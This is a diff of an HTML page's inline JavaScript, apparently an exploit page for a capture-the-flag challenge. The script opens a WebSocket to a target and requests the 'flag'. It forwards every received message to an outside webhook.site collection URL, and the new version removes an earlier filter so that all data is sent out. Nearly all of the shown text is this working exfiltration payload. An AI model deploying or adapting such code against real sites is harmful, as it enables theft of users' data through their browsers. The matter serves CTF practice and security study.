@@ -10,72 +10,65 @@
             const firstWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
             const secondWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/store_flag';
 
-            // Step 1: Send a POST request to the first webhook
+            // Function to handle POST request
+            const sendPostRequest = (url, data) => {
+                return fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+            };
+
+            // Step 1: Send initial POST request
             console.log('Sending initial POST request...');
-            fetch(firstWebhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ message: 'Initial POST request sent' }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Initial POST request sent successfully');
-                    
-                    // Step 2: Open WebSocket connection after the first POST is complete
-                    console.log('Opening WebSocket connection...');
-                    const ws = new WebSocket(wsUrl);
+            sendPostRequest(firstWebhookUrl, { message: 'Initial POST request sent' })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Initial POST request sent successfully');
+                        openWebSocket();
+                    } else {
+                        console.error('Failed to send initial POST request. Response status:', response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending initial POST request:', error);
+                });
 
-                    ws.onopen = () => {
-                        console.log('WebSocket connection opened');
-                        ws.send('flag'); // Request the flag
-                    };
+            // Step 2: Open WebSocket connection
+            const openWebSocket = () => {
+                console.log('Opening WebSocket connection...');
+                const ws = new WebSocket(wsUrl);
 
-                    ws.onmessage = (event) => {
-                        console.log('Received WebSocket message:', event.data);
-                        if (event.data.includes('flag{')) {
-                            const flag = event.data;
-                            console.log('Flag received:', flag);
+                ws.onopen = () => {
+                    console.log('WebSocket connection opened');
+                    ws.send('flag'); // Request the flag
+                };
 
-                            // Step 3: Send the flag to the second webhook
-                            console.log('Sending flag to the second webhook...');
-                            fetch(secondWebhookUrl, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({ flag }),
-                            })
-                            .then(response => {
-                                if (response.ok) {
-                                    console.log('Flag sent successfully to the second webhook');
-                                } else {
-                                    console.error('Failed to send flag to the second webhook. Response status:', response.status);
-                                }
-                            })
-                            .catch(error => {
-                                console.error('Error sending flag to the second webhook:', error);
-                            });
-                        } else {
-                            console.warn('WebSocket message did not contain a flag:', event.data);
-                        }
-                    };
+                ws.onmessage = (event) => {
+                    console.log('Received WebSocket message:', event.data);
+                    sendPostRequest(secondWebhookUrl, { message: event.data })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log('Message sent successfully to the second webhook');
+                            } else {
+                                console.error('Failed to send message to the second webhook. Response status:', response.status);
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error sending message to the second webhook:', error);
+                        });
+                };
 
-                    ws.onerror = (error) => {
-                        console.error('WebSocket error:', error);
-                    };
+                ws.onerror = (error) => {
+                    console.error('WebSocket error:', error);
+                };
 
-                    ws.onclose = () => {
-                        console.log('WebSocket connection closed');
-                    };
-                } else {
-                    console.error('Failed to send the initial POST request. Response status:', response.status);
-                }
-            })
-            .catch(error => {
-                console.error('Error sending initial POST request:', error);
-            });
+                ws.onclose = () => {
+                    console.log('WebSocket connection closed');
+                };
+            };
         });
     </script>
 </head>
